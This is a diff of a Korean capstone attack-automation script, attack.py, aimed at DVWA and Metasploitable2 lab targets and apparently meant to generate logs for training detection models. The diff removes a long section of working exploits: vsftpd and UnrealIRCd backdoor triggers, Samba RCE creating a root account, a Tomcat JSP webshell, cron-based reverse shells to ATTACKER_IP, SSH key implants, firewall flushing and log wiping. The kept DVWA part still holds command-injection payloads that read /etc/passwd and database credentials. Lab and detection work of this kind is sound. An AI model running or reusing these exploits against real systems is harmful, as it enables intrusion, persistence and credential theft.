@@ -3,25 +3,14 @@ from bs4 import BeautifulSoup
 import argparse
 import time
 import sys
-import socket
-import paramiko
-from requests.auth import HTTPBasicAuth
-import zipfile
-import io
-import subprocess
+import os
 
 # ==================== 설정 ====================
 
-# DVWA: WAF(ModSecurity)를 통해 접속 (포트 80)
-DVWA_URL = "http://localhost/dvwa"
+# DVWA: standalone victim-dvwa 컨테이너로 직접 접속 (기본 포트 8080)
+DVWA_URL = os.getenv("DVWA_URL", "http://127.0.0.1:8080").rstrip("/")
 DVWA_LOGIN_URL = f"{DVWA_URL}/login.php"
 DVWA_SECURITY_URL = f"{DVWA_URL}/security.php"
-
-# Metasploitable 2: docker-compose 내부 서비스 이름 또는 직접 IP
-# docker-compose에서 포트가 호스트로 매핑되어 있으므로 localhost 사용
-MSF_IP = "localhost"
-TARGET_IP = "localhost"
-ATTACKER_IP = "192.168.0.50"  # 리버스 쉘이 필요할 경우를 위한 공격자 IP
 
 # 세션 유지를 위한 requests 객체
 session = requests.Session()
@@ -55,7 +44,12 @@ def setup_dvwa_session():
     }
 
     res = session.post(DVWA_LOGIN_URL, data=login_data)
-    if "Welcome to Damn Vulnerable Web App" in res.text or "security.php" in res.text:
+    if (
+        "Welcome to Damn Vulnerable Web App" in res.text
+        or "Welcome to Damn Vulnerable Web Application" in res.text
+        or res.url.endswith("/index.php")
+        or "security.php" in res.text
+    ):
         print("[+] 로그인 성공!")
     else:
         print("[!] 로그인 실패. 자격 증명이나 서버 상태를 확인하세요.")
@@ -84,12 +78,12 @@ def scenario_1_brute_force():
 
     # --- 정찰 단계 ---
     print("\n[*] === 정찰 단계 (Reconnaissance) ===")
-    print("[*] 웹 서버 포트 스캔 시뮬레이션 (Nmap -p 80 -sV)")
+    print("[*] 웹 서버 포트 스캔 시뮬레이션 (Nmap -p 8080 -sV)")
     res = session.get(DVWA_URL)
     if res.status_code == 200:
-        print(f"  [+] 포트 80 열림 확인 - HTTP {res.status_code}")
+        print(f"  [+] 포트 8080 열림 확인 - HTTP {res.status_code}")
     else:
-        print(f"  [!] 포트 80 응답 이상 - HTTP {res.status_code}")
+        print(f"  [!] 포트 8080 응답 이상 - HTTP {res.status_code}")
     time.sleep(0.5)
 
     print("[*] 웹 디렉토리 브루트포싱 시뮬레이션 (Gobuster)")
@@ -323,13 +317,13 @@ def scenario_5_reflected_xss():
 
 
 # ============================================================
-# 파트 2: 통합 시나리오 — DVWA 침투 → 침투 후 공격 (시나리오 11 ~ 15)
+# 파트 2: 통합 시나리오 — DVWA 침투 → 침투 후 공격 (시나리오 6 ~ 10)
 # ============================================================
 
 
-def scenario_11_sqli_credential_dump():
-    """시나리오 11: [통합] SQL Injection 침투 → 크리덴셜 탈취 → 시스템 침투"""
-    print(">>> [시나리오 11] SQL Injection 침투 → 크리덴셜 탈취 → 시스템 침투 시작")
+def scenario_6_sqli_credential_dump():
+    """시나리오 6: [통합] SQL Injection 침투 → 크리덴셜 탈취 → 시스템 침투"""
+    print(">>> [시나리오 6] SQL Injection 침투 → 크리덴셜 탈취 → 시스템 침투 시작")
     url = f"{DVWA_URL}/vulnerabilities/sqli/"
 
     # ========================================
@@ -481,9 +475,9 @@ def scenario_11_sqli_credential_dump():
     print("<<< 공격 완료\n")
 
 
-def scenario_12_cmd_injection_privesc():
-    """시나리오 12: [통합] Command Injection 침투 → 권한 상승 시도"""
-    print(">>> [시나리오 12] Command Injection 침투 → 권한 상승 시도 시작")
+def scenario_7_cmd_injection_privesc():
+    """시나리오 7: [통합] Command Injection 침투 → 권한 상승 시도"""
+    print(">>> [시나리오 7] Command Injection 침투 → 권한 상승 시도 시작")
     url = f"{DVWA_URL}/vulnerabilities/exec/"
 
     # ========================================
@@ -610,9 +604,9 @@ def scenario_12_cmd_injection_privesc():
     print("<<< 공격 완료\n")
 
 
-def scenario_13_file_upload_lateral_movement():
-    """시나리오 13: [통합] File Upload 침투 → 내부 정찰 및 횡적 이동"""
-    print(">>> [시나리오 13] File Upload 침투 → 내부 정찰 및 횡적 이동 시작")
+def scenario_8_file_upload_lateral_movement():
+    """시나리오 8: [통합] File Upload 침투 → 내부 정찰 및 횡적 이동"""
+    print(">>> [시나리오 8] File Upload 침투 → 내부 정찰 및 횡적 이동 시작")
     upload_url = f"{DVWA_URL}/vulnerabilities/upload/"
 
     # ========================================
@@ -715,7 +709,7 @@ def scenario_13_file_upload_lateral_movement():
     # --- 횡적 이동 시도 ---
     print("\n[*] === 횡적 이동 시도 (Lateral Movement) ===")
     print("[*] 내부 네트워크에서 다른 서비스/호스트 탐색")
-    exec_shell_cmd("ping -c 1 -W 1 metasploitable2 2>&1 | head -3", "Metasploitable2 호스트 ping 테스트")
+    exec_shell_cmd("ping -c 1 -W 1 127.0.0.1 2>&1 | head -3", "로컬 호스트 ping 테스트")
     time.sleep(0.5)
     # 내부에서 다른 포트 스캔
     print("[*] 내부 포트 스캔 시뮬레이션")
@@ -729,16 +723,16 @@ def scenario_13_file_upload_lateral_movement():
 
     # --- DB 접근 시도 ---
     print("\n[*] === 데이터베이스 직접 접근 시도 ===")
-    exec_shell_cmd("cat /var/www/html/dvwa/config/config.inc.php 2>/dev/null | grep -i 'db_'",
+    exec_shell_cmd("cat /var/www/html/config/config.inc.php 2>/dev/null | grep -i 'db_'",
                    "DVWA DB 설정 파일에서 크리덴셜 추출")
     time.sleep(0.5)
 
     print("<<< 공격 완료\n")
 
 
-def scenario_14_bruteforce_persistence():
-    """시나리오 14: [통합] Brute Force 침투 → 백도어 설치 및 지속성 확보"""
-    print(">>> [시나리오 14] Brute Force 침투 → 백도어 설치 및 지속성 확보 시작")
+def scenario_9_bruteforce_persistence():
+    """시나리오 9: [통합] Brute Force 침투 → 백도어 설치 및 지속성 확보"""
+    print(">>> [시나리오 9] Brute Force 침투 → 백도어 설치 및 지속성 확보 시작")
     brute_url = f"{DVWA_URL}/vulnerabilities/brute/"
 
     # ========================================
@@ -875,9 +869,9 @@ def scenario_14_bruteforce_persistence():
     print("<<< 공격 완료\n")
 
 
-def scenario_15_xss_session_hijack():
-    """시나리오 15: [통합] Stored XSS 침투 → 세션 하이재킹 → 데이터 유출"""
-    print(">>> [시나리오 15] Stored XSS 침투 → 세션 하이재킹 → 데이터 유출 시작")
+def scenario_10_xss_session_hijack():
+    """시나리오 10: [통합] Stored XSS 침투 → 세션 하이재킹 → 데이터 유출"""
+    print(">>> [시나리오 10] Stored XSS 침투 → 세션 하이재킹 → 데이터 유출 시작")
 
     # ========================================
     # 단계 1: DVWA 침투 (Stored XSS)
@@ -1019,9 +1013,9 @@ def scenario_15_xss_session_hijack():
     cmd_url = f"{DVWA_URL}/vulnerabilities/exec/"
     sensitive_cmds = [
         ("127.0.0.1; cat /etc/passwd | head -10", "시스템 계정 목록 탈취"),
-        ("127.0.0.1; cat /var/www/html/dvwa/config/config.inc.php 2>/dev/null | grep 'db_'",
+        ("127.0.0.1; cat /var/www/html/config/config.inc.php 2>/dev/null | grep 'db_'",
          "DB 접속 정보 탈취"),
-        ("127.0.0.1; ls -la /var/www/html/dvwa/hackable/uploads/", "업로드된 파일 목록 (증거 확인)"),
+        ("127.0.0.1; ls -la /var/www/html/hackable/uploads/", "업로드된 파일 목록 (증거 확인)"),
     ]
     for payload, desc in sensitive_cmds:
         data = {"ip": payload, "Submit": "Submit"}
@@ -1035,518 +1029,41 @@ def scenario_15_xss_session_hijack():
 
 
 # ============================================================
-# 파트 3: Metasploitable2 타깃 공격 시나리오
-# ============================================================
-
-
-def print_step(msg):
-    print(f"\n[+] {msg}")
-
-
-def print_sub(msg):
-    print(f" └── [*] {msg}")
-
-
-def attack_vsftpd():
-    print_step("시나리오 1: vsftpd 2.3.4 백도어 공격 시작")
-    try:
-        print_sub("FTP(21) 포트로 특정 문자열(':)') 전송하여 백도어 개방 시도...")
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(3)
-        s.connect((TARGET_IP, 21))
-        s.recv(1024)
-        s.send(b"USER hacker:)\r\n")
-        s.recv(1024)
-        s.send(b"PASS anything\r\n")
-        s.close()
-
-        time.sleep(2)
-
-        print_sub("6200번 포트(루트 쉘) 접속 및 /etc/shadow 내용 추출 중...")
-        shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        shell.settimeout(5)
-        shell.connect((TARGET_IP, 6200))
-        shell.send(b"echo 'VSFTPD_HACKED' > /tmp/vsftpd_hacked; head -n 3 /etc/shadow\n")
-        result = shell.recv(4096).decode("utf-8", errors="ignore")
-        print_sub(f"추출 결과:\n{result.strip()}")
-        shell.close()
-    except Exception as e:
-        print_sub(f"오류 발생: {e}")
-
-
-def attack_samba():
-    print_step("시나리오 2: Samba usermap_script RCE 공격 시작")
-    payload = "`useradd -o -u 0 -g 0 -M -d /root -s /bin/bash hacker; echo 'hacker:password' | chpasswd`"
-    username_payload = f"'/={payload}'"
-    print_sub("smbclient를 통해 Username 필드에 악성 명령어 주입 중...")
-    cmd = f"smbclient //{TARGET_IP}/tmp -U {username_payload} -N -c 'quit'"
-    try:
-        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        print_sub("페이로드 전송 완료. Victim 시스템에 'hacker' 루트 계정이 생성되었습니다.")
-    except Exception as e:
-        print_sub(f"오류 발생: {e}")
-
-
-def attack_ssh():
-    print_step("시나리오 3: SSH 기본 계정 접속 및 크론탭 조작 시작")
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    try:
-        print_sub("SSH 계정(msfadmin:msfadmin)으로 접속 시도...")
-        client.connect(TARGET_IP, port=22, username="msfadmin", password="msfadmin")
-        print_sub("접속 성공!")
-
-        print_sub("지속성 확보를 위해 악성 크론탭(Cronjob) 등록 중...")
-        cron_cmd = f'(crontab -l 2>/dev/null; echo "* * * * * nc -e /bin/sh {ATTACKER_IP} 4444") | crontab -'
-        stdin, stdout, stderr = client.exec_command(cron_cmd)
-        stdout.read()
-
-        stdin, stdout, stderr = client.exec_command("crontab -l")
-        print_sub(f"현재 크론탭 상태:\n{stdout.read().decode('utf-8').strip()}")
-    except Exception as e:
-        print_sub(f"오류 발생: {e}")
-    finally:
-        client.close()
-
-
-def attack_tomcat():
-    print_step("시나리오 4: Tomcat 관리자 페이지 악성 WAR 파일 업로드 시작")
-    war_buffer = io.BytesIO()
-    with zipfile.ZipFile(war_buffer, "w") as zf:
-        jsp_code = '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
-        zf.writestr("shell.jsp", jsp_code)
-    war_buffer.seek(0)
-
-    print_sub("Tomcat Manager(기본 계정 tomcat:tomcat)를 통해 웹쉘 배포 중...")
-    deploy_url = f"http://{TARGET_IP}:8180/manager/deploy?path=/malware&update=true"
-    try:
-        res = requests.put(deploy_url, auth=HTTPBasicAuth("tomcat", "tomcat"), data=war_buffer.read())
-        if res.status_code == 200:
-            print_sub("웹쉘 업로드 성공! (/malware/shell.jsp)")
-            print_sub("업로드된 웹쉘을 호출하여 wget 명령어 실행 유도...")
-            shell_url = f"http://{TARGET_IP}:8180/malware/shell.jsp"
-            cmd_payload = "wget http://google.com -O /tmp/downloaded_malware.sh"
-            requests.get(shell_url, params={"cmd": cmd_payload})
-            print_sub("웹쉘 명령 실행 완료.")
-        else:
-            print_sub(f"업로드 실패. HTTP 상태 코드: {res.status_code}")
-    except Exception as e:
-        print_sub(f"오류 발생: {e}")
-
-
-def attack_unrealircd():
-    print_step("시나리오 5: UnrealIRCd 백도어 및 방어 회피 공격 시작")
-    cmd = "echo 'Hacked via IRC' > /tmp/irc_hacked; cat /dev/null > ~/.bash_history; history -c"
-    payload = f"AB; {cmd}\n"
-    print_sub("IRC(6667) 포트로 백도어 페이로드 및 흔적 지우기(Wiper) 명령 전송 중...")
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(3)
-        s.connect((TARGET_IP, 6667))
-        s.send(payload.encode())
-        s.close()
-        print_sub("공격 페이로드 전송 완료. 시스템 명령어가 실행되었습니다.")
-    except Exception as e:
-        print_sub(f"오류 발생: {e}")
-
-
-def attack_vsftpd_ssh_persistence():
-    print_step("시나리오 6: vsftpd 백도어 침투 → SSH 키 삽입으로 지속성 확보")
-    try:
-        print_sub("[단계 1] FTP(21) 백도어 트리거 중...")
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(3)
-        s.connect((TARGET_IP, 21))
-        s.recv(1024)
-        s.send(b"USER backdoor:)\r\n")
-        s.recv(1024)
-        s.send(b"PASS anything\r\n")
-        s.close()
-        time.sleep(2)
-
-        print_sub("[단계 2] 6200번 포트(루트 쉘) 접속 후 SSH 공개키 삽입 중...")
-        shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        shell.settimeout(5)
-        shell.connect((TARGET_IP, 6200))
-        fake_pubkey = "ssh-rsa AAAAB3FakePublicKeyForDemoOnly== attacker@kali"
-        cmds = [
-            "mkdir -p /root/.ssh",
-            f"echo '{fake_pubkey}' >> /root/.ssh/authorized_keys",
-            "chmod 600 /root/.ssh/authorized_keys",
-            "chmod 700 /root/.ssh",
-            "echo '[PERSISTENCE] SSH 키 삽입 완료'",
-        ]
-        shell.send((" && ".join(cmds) + "\n").encode())
-        time.sleep(2)
-        result = shell.recv(4096).decode("utf-8", errors="ignore")
-        print_sub(f"결과: {result.strip()}")
-
-        shell.send(b"cat /root/.ssh/authorized_keys\n")
-        time.sleep(1)
-        verify = shell.recv(4096).decode("utf-8", errors="ignore")
-        print_sub(f"authorized_keys 내용:\n{verify.strip()}")
-        shell.close()
-    except Exception as e:
-        print_sub(f"오류 발생: {e}")
-
-
-def attack_samba_network_scan():
-    print_step("시나리오 7: Samba RCE 침투 → 내부 네트워크 스캔 (횡적 이동 준비)")
-    recon_script = (
-        "echo '=== NETWORK RECON START ===' > /tmp/recon_result.txt; "
-        "ifconfig >> /tmp/recon_result.txt 2>/dev/null; "
-        "arp -a >> /tmp/recon_result.txt 2>/dev/null; "
-        "for i in 1 2 50 100 254; do "
-        "ping -c 1 -W 1 192.168.0.$i > /dev/null 2>&1 && "
-        "echo \"HOST UP: 192.168.0.$i\" >> /tmp/recon_result.txt; "
-        "done; "
-        "for port in 22 80 443 3306 8080; do "
-        "(echo > /dev/tcp/192.168.0.50/$port) 2>/dev/null && "
-        "echo \"PORT OPEN: 192.168.0.50:$port\" >> /tmp/recon_result.txt; "
-        "done; "
-        "echo '=== NETWORK RECON END ===' >> /tmp/recon_result.txt"
-    )
-    payload = f"`{recon_script}`"
-    username_payload = f"'/={payload}'"
-    print_sub("[단계 1] Samba RCE를 통해 네트워크 정찰 스크립트 주입 중...")
-    cmd = f"smbclient //{TARGET_IP}/tmp -U {username_payload} -N -c 'quit'"
-    try:
-        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15)
-        print_sub("네트워크 정찰 스크립트 실행 완료.")
-    except subprocess.TimeoutExpired:
-        print_sub("명령 시간 초과 (정상적일 수 있음, 페이로드는 이미 전송됨).")
-    except Exception as e:
-        print_sub(f"오류 발생: {e}")
-
-    time.sleep(3)
-    print_sub("[단계 2] vsftpd 백도어를 통해 정찰 결과 파일 회수 중...")
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(3)
-        s.connect((TARGET_IP, 21))
-        s.recv(1024)
-        s.send(b"USER recon:)\r\n")
-        s.recv(1024)
-        s.send(b"PASS x\r\n")
-        s.close()
-        time.sleep(2)
-
-        shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        shell.settimeout(5)
-        shell.connect((TARGET_IP, 6200))
-        shell.send(b"cat /tmp/recon_result.txt\n")
-        time.sleep(2)
-        result = shell.recv(8192).decode("utf-8", errors="ignore")
-        print_sub(f"내부 네트워크 정찰 결과:\n{result.strip()}")
-        shell.close()
-    except Exception as e:
-        print_sub(f"정찰 결과 회수 실패: {e}")
-
-
-def attack_ssh_privesc_exfil():
-    print_step("시나리오 8: SSH 침투 → 권한 상승 시도 + 민감 데이터 유출")
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    try:
-        print_sub("[단계 1] SSH 약한 자격 증명(msfadmin:msfadmin)으로 침투 중...")
-        client.connect(TARGET_IP, port=22, username="msfadmin", password="msfadmin")
-        print_sub("SSH 접속 성공!")
-
-        print_sub("[단계 2-1] 시스템 열거(Enumeration) 수행 중...")
-        enum_cmds = [
-            ("uname -a", "커널 정보"),
-            ("id", "현재 사용자 권한"),
-            ("cat /etc/os-release 2>/dev/null || cat /etc/issue", "OS 정보"),
-            ("df -h", "디스크 사용량"),
-            ("w", "현재 접속 사용자"),
-        ]
-        for cmd, desc in enum_cmds:
-            stdin, stdout, stderr = client.exec_command(cmd)
-            output = stdout.read().decode("utf-8", errors="ignore").strip()
-            print_sub(f"  {desc}: {output[:120]}")
-            time.sleep(0.3)
-
-        print_sub("[단계 2-2] SUID 바이너리 탐색 중 (권한 상승 벡터 검색)...")
-        stdin, stdout, stderr = client.exec_command("find / -perm -u=s -type f 2>/dev/null | head -15")
-        suid_result = stdout.read().decode("utf-8", errors="ignore").strip()
-        print_sub(f"  발견된 SUID 바이너리:\n{suid_result}")
-        time.sleep(0.5)
-
-        print_sub("[단계 2-3] sudo 권한 확인 중...")
-        stdin, stdout, stderr = client.exec_command("echo 'msfadmin' | sudo -S -l 2>/dev/null")
-        sudo_result = stdout.read().decode("utf-8", errors="ignore").strip()
-        print_sub(f"  sudo 권한: {sudo_result[:200]}" if sudo_result else "  sudo 권한 없음 또는 확인 불가")
-
-        print_sub("[단계 2-4] 민감 데이터 수집 및 유출 중...")
-        exfil_cmds = [
-            ("cat /etc/passwd", "/etc/passwd"),
-            ("cat /etc/shadow 2>/dev/null || echo 'Permission Denied'", "/etc/shadow"),
-            ("cat /etc/mysql/debian.cnf 2>/dev/null || echo 'Not Found'", "MySQL 인증 정보"),
-            ("find /home -name '*.txt' -o -name '*.conf' -o -name '*.cfg' 2>/dev/null | head -10", "홈 디렉토리 설정 파일"),
-        ]
-        for cmd, desc in exfil_cmds:
-            stdin, stdout, stderr = client.exec_command(cmd)
-            output = stdout.read().decode("utf-8", errors="ignore").strip()
-            if output:
-                print_sub(f"  [{desc}] 수집 완료 ({len(output)} bytes)")
-            time.sleep(0.3)
-
-        print_sub("[단계 2-5] 수집된 데이터를 /tmp/exfil_data.tar.gz로 패키징 중...")
-        stdin, stdout, stderr = client.exec_command(
-            "tar czf /tmp/exfil_data.tar.gz /etc/passwd /etc/shadow "
-            "/etc/mysql/debian.cnf 2>/dev/null; ls -la /tmp/exfil_data.tar.gz"
-        )
-        tar_result = stdout.read().decode("utf-8", errors="ignore").strip()
-        print_sub(f"  패키징 결과: {tar_result}")
-    except Exception as e:
-        print_sub(f"오류 발생: {e}")
-    finally:
-        client.close()
-
-
-def attack_tomcat_reverse_shell():
-    print_step("시나리오 9: Tomcat 침투 → 리버스 쉘 배포 + 방화벽 무력화")
-    print_sub("[단계 1] Tomcat Manager를 통해 고급 웹쉘 배포 중...")
-    jsp_code = (
-        '<%@ page import="java.util.*,java.io.*"%>'
-        '<%String cmd=request.getParameter("cmd");'
-        'if(cmd!=null){'
-        'Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});'
-        'Scanner s=new Scanner(p.getInputStream()).useDelimiter("\\\\A");'
-        'out.println(s.hasNext()?s.next():"");}%>'
-    )
-    war_buffer = io.BytesIO()
-    with zipfile.ZipFile(war_buffer, "w") as zf:
-        zf.writestr("cmd.jsp", jsp_code)
-    war_buffer.seek(0)
-    deploy_url = f"http://{TARGET_IP}:8180/manager/deploy?path=/backdoor&update=true"
-    try:
-        res = requests.put(deploy_url, auth=HTTPBasicAuth("tomcat", "tomcat"), data=war_buffer.read(), timeout=10)
-        if res.status_code != 200:
-            print_sub(f"웹쉘 배포 실패 (HTTP {res.status_code})")
-            return
-
-        print_sub("웹쉘 배포 성공! (/backdoor/cmd.jsp)")
-        shell_url = f"http://{TARGET_IP}:8180/backdoor/cmd.jsp"
-        print_sub("[단계 2-1] 웹쉘로 시스템 정보 수집 중...")
-        for cmd in ["id", "uname -a", "cat /etc/hostname"]:
-            r = requests.get(shell_url, params={"cmd": cmd}, timeout=5)
-            output = r.text.strip()
-            if output:
-                print_sub(f"  {cmd}: {output[:150]}")
-            time.sleep(0.3)
-
-        print_sub("[단계 2-2] 방화벽(iptables) 규칙 확인 및 무력화 시도...")
-        r = requests.get(shell_url, params={"cmd": "iptables -L -n 2>&1"}, timeout=5)
-        print_sub(f"  현재 iptables 규칙:\n{r.text.strip()[:300]}")
-        for fw_cmd in ["iptables -P INPUT ACCEPT", "iptables -P FORWARD ACCEPT", "iptables -P OUTPUT ACCEPT", "iptables -F"]:
-            requests.get(shell_url, params={"cmd": fw_cmd}, timeout=5)
-            time.sleep(0.3)
-        print_sub("  방화벽 정책 ACCEPT 전환 및 규칙 초기화 완료.")
-
-        print_sub("[단계 2-3] 리버스 쉘 스크립트 생성 및 실행 예약 중...")
-        reverse_shell_script = (
-            f"#!/bin/bash\\n"
-            f"while true; do\\n"
-            f"  /bin/bash -i >& /dev/tcp/{ATTACKER_IP}/9999 0>&1 2>/dev/null\\n"
-            f"  sleep 60\\n"
-            f"done"
-        )
-        write_cmd = f"echo -e '{reverse_shell_script}' > /tmp/rev.sh && chmod +x /tmp/rev.sh"
-        requests.get(shell_url, params={"cmd": write_cmd}, timeout=5)
-        cron_cmd = '(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/rev.sh") | crontab -'
-        requests.get(shell_url, params={"cmd": cron_cmd}, timeout=5)
-        print_sub("  리버스 쉘 스크립트 배치 및 크론잡 등록 완료.")
-        r = requests.get(shell_url, params={"cmd": "crontab -l"}, timeout=5)
-        print_sub(f"  현재 크론탭:\n{r.text.strip()}")
-    except Exception as e:
-        print_sub(f"오류 발생: {e}")
-
-
-def attack_unrealircd_rootkit():
-    print_step("시나리오 10: UnrealIRCd 침투 → 루트킷 설치 시뮬레이션 + 로그 완전 삭제")
-    try:
-        print_sub("[단계 1] IRC(6667) 백도어 트리거 및 초기 정찰 중...")
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(5)
-        s.connect((TARGET_IP, 6667))
-        time.sleep(1)
-        try:
-            s.recv(4096)
-        except socket.timeout:
-            pass
-        s.send(b"AB; id; uname -a; cat /etc/hostname\n")
-        time.sleep(2)
-        try:
-            recon_result = s.recv(4096).decode("utf-8", errors="ignore").strip()
-            print_sub(f"  초기 정찰 결과: {recon_result[:200]}")
-        except socket.timeout:
-            print_sub("  초기 정찰 결과 수신 타임아웃 (명령은 실행됨)")
-        s.close()
-
-        time.sleep(1)
-        print_sub("[단계 2] 백도어 재접속 후 루트킷 시뮬레이션 + 로그 삭제 수행 중...")
-        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s2.settimeout(5)
-        s2.connect((TARGET_IP, 6667))
-        time.sleep(1)
-        try:
-            s2.recv(4096)
-        except socket.timeout:
-            pass
-
-        rootkit_cmds = [
-            "mkdir -p /dev/shm/.hidden",
-            "echo '#!/bin/bash' > /dev/shm/.hidden/syscheck",
-            f"echo '/bin/bash -i >& /dev/tcp/{ATTACKER_IP}/8888 0>&1' >> /dev/shm/.hidden/syscheck",
-            "chmod +x /dev/shm/.hidden/syscheck",
-            "ln -sf /dev/shm/.hidden/syscheck /dev/shm/.hidden/kworker",
-        ]
-        s2.send(f"AB; {' && '.join(rootkit_cmds)}\n".encode())
-        time.sleep(2)
-        print_sub("  루트킷 시뮬레이션 파일 배치 완료 (/dev/shm/.hidden/)")
-
-        log_wipe_cmds = [
-            "cat /dev/null > /var/log/auth.log",
-            "cat /dev/null > /var/log/syslog",
-            "cat /dev/null > /var/log/wtmp",
-            "cat /dev/null > /var/log/lastlog",
-            "cat /dev/null > /root/.bash_history",
-            "cat /dev/null > /home/msfadmin/.bash_history 2>/dev/null",
-            "echo 'ROOTKIT_INSTALLED' > /tmp/rootkit_status",
-        ]
-        s2.send(f"AB; {' && '.join(log_wipe_cmds)}\n".encode())
-        time.sleep(2)
-        print_sub("  시스템 로그 전체 삭제 완료 (auth.log, syslog, wtmp, lastlog, bash_history)")
-        s2.send(b"AB; cat /tmp/rootkit_status; ls -la /dev/shm/.hidden/\n")
-        time.sleep(2)
-        try:
-            verify = s2.recv(4096).decode("utf-8", errors="ignore").strip()
-            print_sub(f"  검증 결과:\n{verify[:300]}")
-        except socket.timeout:
-            print_sub("  검증 결과 수신 타임아웃")
-        s2.close()
-    except Exception as e:
-        print_sub(f"오류 발생: {e}")
-
-
-METASPLOITABLE_SCENARIOS = {
-    1: attack_vsftpd,
-    2: attack_samba,
-    3: attack_ssh,
-    4: attack_tomcat,
-    5: attack_unrealircd,
-    6: attack_vsftpd_ssh_persistence,
-    7: attack_samba_network_scan,
-    8: attack_ssh_privesc_exfil,
-    9: attack_tomcat_reverse_shell,
-    10: attack_unrealircd_rootkit,
-}
-
-
-def print_metasploitable_menu():
-    print("=" * 60)
-    print("  [ AI 학습 로그 생성용 Metasploitable2 자동 공격 도구 ]  ")
-    print("=" * 60)
-    print("\n[기본 시나리오]")
-    print("  1. vsftpd 2.3.4 백도어 (정보 유출)")
-    print("  2. Samba usermap_script (루트 계정 생성)")
-    print("  3. SSH 무차별 대입 (크론탭 지속성)")
-    print("  4. Tomcat 웹쉘 업로드 (원격 명령어 실행)")
-    print("  5. UnrealIRCd 백도어 (방어 회피/로그 삭제)")
-    print("\n[통합 시나리오 — 침투 → 침투 후 공격]")
-    print("  6. vsftpd 백도어 → SSH 키 삽입 (지속성 확보)")
-    print("  7. Samba RCE → 내부 네트워크 스캔 (횡적 이동 정찰)")
-    print("  8. SSH 침투 → 권한 상승 시도 + 민감 데이터 유출")
-    print("  9. Tomcat 침투 → 리버스 쉘 배포 + 방화벽 무력화")
-    print(" 10. UnrealIRCd 침투 → 루트킷 시뮬레이션 + 로그 완전 삭제")
-    print("\n[일괄 실행]")
-    print(" 11. 기본 시나리오 전체 실행 (1~5)")
-    print(" 12. 통합 시나리오 전체 실행 (6~10)")
-    print(" 13. 전체 시나리오 실행 (1~10)")
-    print("=" * 60)
-
-
-def run_metasploitable_scenario(scenario):
-    if scenario in METASPLOITABLE_SCENARIOS:
-        METASPLOITABLE_SCENARIOS[scenario]()
-    elif scenario == 11:
-        for i in range(1, 6):
-            METASPLOITABLE_SCENARIOS[i]()
-            time.sleep(2)
-    elif scenario == 12:
-        for i in range(6, 11):
-            METASPLOITABLE_SCENARIOS[i]()
-            time.sleep(2)
-    elif scenario == 13:
-        for i in range(1, 11):
-            METASPLOITABLE_SCENARIOS[i]()
-            time.sleep(2)
-    else:
-        print("잘못된 입력입니다.")
-
-
-# ============================================================
 # 메인 함수
 # ============================================================
 
 
 def main():
     parser = argparse.ArgumentParser(
-        description="캡스톤디자인 통합 공격 시나리오 자동화 스크립트 (DVWA + Metasploitable2)"
+        description="캡스톤디자인 DVWA 공격 시나리오 자동화 스크립트"
     )
     parser.add_argument(
         "-s",
         "--scenario",
         type=int,
-        choices=[1, 2, 3, 4, 5, 11, 12, 13, 14, 15],
-        help="실행할 DVWA 공격 시나리오 번호 (1~5, 11~15)",
+        choices=range(1, 11),
+        help="실행할 DVWA 공격 시나리오 번호 (1~10)",
     )
-    parser.add_argument(
-        "-m",
-        "--metasploitable-scenario",
-        type=int,
-        choices=range(1, 14),
-        help="실행할 Metasploitable2 공격 시나리오 번호 (1~13)",
-    )
-
     args = parser.parse_args()
-
-    if args.scenario and args.metasploitable_scenario:
-        parser.error("DVWA 시나리오(-s)와 Metasploitable2 시나리오(-m)는 동시에 지정할 수 없습니다.")
-
-    if args.metasploitable_scenario:
-        run_metasploitable_scenario(args.metasploitable_scenario)
-        return
 
     if not args.scenario:
         print("=" * 60)
-        print("캡스톤디자인 통합 공격 시나리오 자동화 스크립트")
+        print("캡스톤디자인 DVWA 공격 시나리오 자동화 스크립트")
         print("=" * 60)
-        print("\n[파트 1] DVWA 타깃 공격 (WAF 경유):")
+        print("\n[파트 1] DVWA 타깃 공격 (standalone DVWA, 기본 http://127.0.0.1:8080):")
         print("  1. 웹 로그인 폼 무차별 대입 (Brute Force)")
         print("  2. 시스템 명령어 삽입 (Command Injection)")
         print("  3. 자동화된 데이터베이스 유출 (SQL Injection)")
         print("  4. 웹 쉘(Web Shell) 업로드")
         print("  5. 악성 스크립트 반사 (Reflected XSS)")
         print("\n[파트 2] 통합 시나리오 — DVWA 침투 → 침투 후 공격:")
-        print("  11. SQL Injection 침투 → 크리덴셜 탈취 → 시스템 침투")
-        print("  12. Command Injection 침투 → 권한 상승 시도")
-        print("  13. File Upload 침투 → 내부 정찰 및 횡적 이동")
-        print("  14. Brute Force 침투 → 백도어 설치 및 지속성 확보")
-        print("  15. Stored XSS 침투 → 세션 하이재킹 → 데이터 유출")
-        print("\n[파트 3] Metasploitable2 타깃 공격:")
-        print_metasploitable_menu()
+        print("  6. SQL Injection 침투 → 크리덴셜 탈취 → 시스템 침투")
+        print("  7. Command Injection 침투 → 권한 상승 시도")
+        print("  8. File Upload 침투 → 내부 정찰 및 횡적 이동")
+        print("  9. Brute Force 침투 → 백도어 설치 및 지속성 확보")
+        print("  10. Stored XSS 침투 → 세션 하이재킹 → 데이터 유출")
         print("\n사용법:")
         print("  python attack.py -s [DVWA_시나리오번호]")
-        print("  python attack.py -m [Metasploitable2_시나리오번호]")
-        print("  python attack.py  # Metasploitable2 대화형 메뉴")
-        try:
-            choice = int(input("\n실행할 Metasploitable2 시나리오 번호를 입력하세요: "))
